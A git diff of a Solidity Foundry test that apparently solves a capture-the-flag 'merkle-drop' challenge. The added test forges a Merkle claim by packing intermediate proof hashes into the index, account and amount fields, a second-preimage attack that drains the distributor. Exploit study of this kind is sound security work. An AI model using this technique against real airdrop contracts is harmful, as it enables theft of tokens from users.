@@ -5,41 +5,6 @@ import "forge-std/console2.sol";
 import "forge-std/Test.sol";
 import {Setup, Token, MerkleDistributor} from "../src/merkle-drop/Setup.sol";
 
-/**
- * Setup:
- *   - merkleDistributor is setup with token "token" and a merkle root of "0x5176d84267cd453dad23d8f698d704fc7b7ee6283b5131cb3de77e58eb9c3ec3
- *   - token drops 75000 tokens to merkleDistrubutor contract
- *
- * Pass Conditions:
- *   - MerkleDistributor must have a zero balance
- *   - All 64 claimants must not have claimed
- *
- * Solution:
- *   - Meaning some proof or proofs outside of the tree.json must be found to
- *     claim the tokens
- *   - Proof Logic:
- *     - A computedHash is derived by hashing of the index + account + amount,
- *       which represents a "leaf" or "node" of the merkle tree
- *     - This along with the merkle root and proof are passed to the verify() function
- *     - verify() iterates over each element in the proof array
- *     - if the computedHash < proofElement, computedHash becomes
- *       hash(computed hash + proof element)
- *     - otherwise computed hash becomes hash(proof element + computed hash)
- *     - If the computed hash equals the root, then it's proven that the index,
- *       account and amount initially passed is correct.
- *   - Thoughts:
- *     - The verify function provides no validation of a proof array of 0 length
- *       is necessary. Thereby if an index account and amount can be found where
- *       the hash of them matches the merkle root than it should be
- *       withdrawable.
- *       Thats obviously impossible as would require to reverse a hash function
- *     - Is it possible to extend the leafs beyond the currently existing tree?
- *       We could "grow" the tree using the information we have to construct the
- *       65th and 66th index. This is not possible as again to "grow" the tree
- *       is impossible as it would require breaking keccak
- *
- *
- */
 contract ExploitMerkleDrop is Test {
     Setup s;
     Token t;
@@ -51,66 +16,41 @@ contract ExploitMerkleDrop is Test {
         md = s.merkleDistributor();
     }
 
-    function test__claim() public {
-        address account = 0x00E21E550021Af51258060A0E18148e36607C9df;
-        uint256 index = 0;
-        uint96 amount = 0x09906894166afcc878;
-        bytes32[] memory proof = new bytes32[](6);
-
-        uint256 prevMdBalance = t.balanceOf(address(md));
-        proof[0] = bytes32(0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a);
-        proof[1] = bytes32(0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69);
-        proof[2] = bytes32(0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298);
-        proof[3] = bytes32(0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f);
-        proof[4] = bytes32(0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e);
-        proof[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
-
-        md.claim(index, account, amount, proof);
-
-        uint256 postMdBalance = t.balanceOf(address(md));
-        assertEq(prevMdBalance, postMdBalance + amount);
-        assertTrue(md.isClaimed(index));
-    }
-
     function test__exploit() public {
-        // address account0 = 0x00E21E550021Af51258060A0E18148e36607C9df;
-        // uint256 index0 = 0;
-        // uint96 amount0 = type(uint96).max;//0x09906894166afcc878;
-        // bytes32 node0 = keccak256(abi.encodePacked(index0, account0, amount0));
-        // bytes32 n0 = 0xa9e8f0fbf0d2911d746500a7786606d3fc80abb68a05f77fb730ded04a951c2d;
-        // assertEq(node0, n0);
+        // Index 37 and 19 packing
+        bytes32[] memory proof1 = new bytes32[](5);
+        proof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d); // 1st proof element for indexes 19 & 37
+        proof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde); // 2nd proof element for indexes 19 & 37
+        proof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813); // 3rd proof element for indexes 19 & 37
+        proof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c); // 4th proof element for indexes 19 & 37
+        proof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5); // 5th proof element for indexes 19 & 37
 
-        // address account58 = 0xcee18609823ac7c71951fe05206C9924722372A6;
-        // uint256 index58 = 58;
-        // uint96 amount58 = 0x3dfa72c4c7dd942165;
-        // bytes32 node58 = keccak256(abi.encodePacked(index58, account58, amount58));
-        // bytes32 n58 = 0xa37b8b0377c63d3582581c28a09c10284a03a6c4185dfa5c29e20dbce1a1427a;
-        // assertEq(node58, n58);
+        uint256 index1 = 0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442; // 0th proof element for index 19
+        address account1 = 0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A; // First 160 bits for 0th proof element of index 37
+        uint96 amount1 = 0xf40f0c122ae08d2207b; // Last 96 bits for 0th proof element of index 37
 
-        // console.logBytes32(bytes32() << 2);
-        // console.log(node58 < n0);
-        // console.logBytes32(keccak256(abi.encodePacked(node58, n0)));
+        md.claim(index1, account1, amount1, proof1);
 
-        bytes32[] memory proof = new bytes32[](5);
-        proof[0] = bytes32(0x0ae01ec0f7a50774e0c1ad35f0f5efcc14c376f675704a6212b483bfbf742a69);
-        proof[1] = bytes32(0x3f267b524a6acda73b1d3e54777f40b188c66a14a090cd142a7ec48b13422298);
-        proof[2] = bytes32(0xe2eae0dabf8d82b313729f55298625b7ac9ba0f12e408529bae4a2ce405e7d5f);
-        proof[3] = bytes32(0x01cf774c22de70195c31bde82dc3ec94807e4e4e01a42aca6d5adccafe09510e);
-        proof[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
-        uint256 index =
-            0xA37B8b0377C63d3582581C28a09C10284a03a6c4185dfa5c29e20dbce1a1427a;
-        address account = 0xa9e8F0FBF0d2911d746500A7786606d3fC80abb6;
-        uint96 amount = 0x8a05f77fb730ded04a951c2d;
-        console2.log(abi.encodePacked(index, account, amount).length);
-        md.claim(index, account, amount, proof);
-        // if (computedHash < proofElement) {
-        //     // Hash(current computed hash + current element of the proof)
-        //     computedHash = keccak256(abi.encodePacked(computedHash, proofElement));
-        // } else {
-        //     // Hash(current element of the proof + current computed hash)
-        //     computedHash = keccak256(abi.encodePacked(proofElement, computedHash));
-        // }
-        //console.log("node:", uint256(node));
-        //assertTrue(s.isSolved());
+        console2.log("contract balance:", t.balanceOf(address(md)));
+
+        // Normal claim for index 8
+        bytes32[] memory proof2 = new bytes32[](6);
+
+        proof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);
+        proof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);
+        proof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);
+        proof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);
+        proof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);
+        proof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);
+
+        uint256 index2 = 8;
+        address account2 = 0x249934e4C5b838F920883a9f3ceC255C0aB3f827;
+        uint96 amount2 = 0xa0d154c64a300ddf85;
+
+        md.claim(index2, account2, amount2, proof2);
+
+        console2.log("contract balance:", t.balanceOf(address(md)));
+
+        assertTrue(s.isSolved());
     }
 }
